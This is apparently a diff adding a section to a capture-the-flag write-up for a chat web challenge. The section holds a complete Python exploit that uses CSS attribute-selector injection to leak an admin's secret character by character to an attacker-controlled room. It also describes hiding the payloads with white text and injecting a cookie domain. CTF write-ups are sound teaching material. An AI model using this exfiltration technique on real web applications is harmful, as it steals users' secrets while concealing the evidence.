@@ -326,3 +326,89 @@ Final payload:
 ```python
 
 ```
+
+## Further improvements to the exploit chain
+The following exploit automates the process of retrieving the secret from the chat. This allows it to repeat the CSS injection multiple times, in the same /report admin timespan. This makes it possible for the attacker to retrieve the secret with only two /report requests, and maybe a single one, on a network with lower latency.
+
+It also utilizes two covert tactics.
+The first tactic, is simply leaking the secret to an other room, as we control the room defined in the CSS injection.
+The second tactic, is setting the CSS `p{color:#fff;}`, which turns all text white. One could also position arguments and similar properties, in order to hide the payloads. As the user reloads the page, all evidences will be gone.
+
+The full almost automatic exploit:
+```python
+
+#!/usr/bin/env python3
+import requests
+import uuid
+import urllib
+import string
+import json
+import sys
+
+baseurl = "https://cat-chat.web.ctfcompetition.com"
+
+roomId = str(uuid.uuid4())
+leakRoomId = str(uuid.uuid4())
+
+roomUrl = "{}/room/{}".format(baseurl, roomId)
+print("Join {}/".format(roomUrl))
+leakRoomUrl = "{}/room/{}".format(baseurl, leakRoomId)
+print("Leak room {}/".format(leakRoomUrl))
+
+headers = {
+    'referer': roomUrl
+}
+
+def send(roomUrl, name, msg):
+    name = urllib.parse.quote(name)
+    url = "{}/send?name={}&msg={}".format(roomUrl, name, msg)
+    r = requests.get(url, headers=headers)
+    return r
+
+def searchReceive(search, roomUrl, timeout=None):
+    r = requests.get("{}/receive".format(roomUrl), stream=True, timeout=timeout)
+    for chunk in r.iter_content(chunk_size = None):
+        data = chunk.decode('ascii')
+        if search in data:
+            return data
+
+def genCSSLine(s):
+    return 'span[data-secret^=' + s + ']{background-image:url(' + leakRoomUrl + '/send?name=flag&msg=' + s + ');}'
+
+def getCurrentSecret():
+    data = searchReceive('"name":"flag","msg":"', leakRoomUrl, 5)
+    datapoints = data.split("data: ")
+    secretPoint = next(json.loads(point.strip()) for point in datapoints if "CTF" in point)
+    return secretPoint["msg"]
+
+arg = str(sys.argv[1]) if len(sys.argv) > 1 else ""
+res = "CTF\{" + arg
+
+while True:
+    print("Please /report")
+    searchReceive("I will ruthlessly ban anyone", roomUrl)
+    while True:
+        print("Testing with {}".format(res))
+
+
+        payload  = 'a],p{color:#fff;}'
+        payload += ''.join([genCSSLine(res + c) for c in string.ascii_letters + string.digits + "_"])
+        payload += genCSSLine(res + "\}")
+        send(roomUrl, payload, "dog")
+
+        payload = "/secret deadbeef; Domain=foo.web.ctfcompetition.com"
+        send(roomUrl, payload, "dog")
+
+        # We will get a timeout here if the admin has left
+        try:
+            res = getCurrentSecret()
+        except:
+            break
+
+        print("Flag is currently {}".format(res))
+
+        if "}" in res:
+            print("Found flag: {}".format(res))
+            sys.exit()
+        res = res.replace("{", "\\{")
+```
